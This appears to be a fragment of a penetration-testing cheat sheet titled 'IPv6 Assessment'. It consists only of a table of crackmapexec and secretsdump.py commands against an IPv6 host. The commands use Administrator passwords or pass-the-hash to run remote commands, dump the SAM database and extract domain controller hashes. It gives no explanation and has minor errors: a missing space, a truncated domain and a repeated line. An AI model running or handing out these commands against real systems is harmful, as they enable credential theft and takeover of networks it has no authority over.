### IPv6 Assessment
| for Example  |
| ------------- |
|crackmapexec 2001:DB8:7654:3210:FEDC:BA98:7654:3210 -u Administrator -p 'Passw0rd' -x "ipconfig" |
|crackmapexec 2001:DB8:7654:3210:FEDC:BA98:7654:3210-u Administrator -H "Hash" --sam |
|crackmapexec cme-hosts.txt -u Administrator -H "Hash" --sam |
|crackmapexec 2001:DB8:7654:3210:FEDC:BA98:7654:3210 -u Administrator -H "Hash" -x "hostname"|
|python secretsdump.py -hashes "Hash" -just-dc acmebank.loca/Administrator@2001:DB8:7654:3210:FEDC:BA98:7654:3210 |
|crackmapexec 2001:DB8:7654:3210:FEDC:BA98:7654:3210 -u Administrator -p 'Passw0rd' -x "ipconfig" |
